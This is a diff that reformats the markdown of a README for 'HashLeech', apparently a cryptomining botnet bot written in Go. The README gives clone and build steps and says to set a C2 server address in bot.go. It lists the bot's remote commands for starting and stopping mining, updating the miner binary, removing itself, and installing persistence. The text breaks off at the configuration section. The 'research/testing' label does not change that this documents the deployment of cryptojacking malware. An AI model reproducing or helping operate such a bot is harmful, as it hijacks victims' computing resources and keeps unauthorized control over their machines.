@@ -38,32 +38,38 @@ graph TD
 
 Installation
 For Research/Testing Purposes
+```Text
 Clone the repository:
-
-bash
+```
+```bash
 git clone https://github.com/yourusername/HashLeech.git
 cd HashLeech
 Configure the C2 server address in bot.go:
-
-go
+```
+```go
 const C2Address = "your.c2.server.com:7003"
-Build the bot:
+```
 
-bash
+Build the bot:
+```bash
 go build -o HashLeech
 Run the bot:
+```
 
-bash
+```bash
 ./HashLeech
+```
 Command Reference
-Command	Description	Example
-START	Start mining operation	START
-STOP	Stop mining operation	STOP
-UPDATE	Update miner binary	UPDATE
-KILL	Remove miner and bot	KILL
-PERSIST	Install persistence mechanism	PERSIST
-Configuration
-Edit the following constants in bot.go before building:
+|------------|------------|----------------|
+||
+|Command	Description	Example|
+|START	Start mining operation	START|
+|STOP	Stop mining operation	STOP|
+|UPDATE	Update miner binary	UPDATE|
+|KILL	Remove miner and bot	KILL|
+|PERSIST	Install persistence mechanism	PERSIST|
+|Configuration
+|Edit the following constants in bot.go before building:|
 
 go
 const (
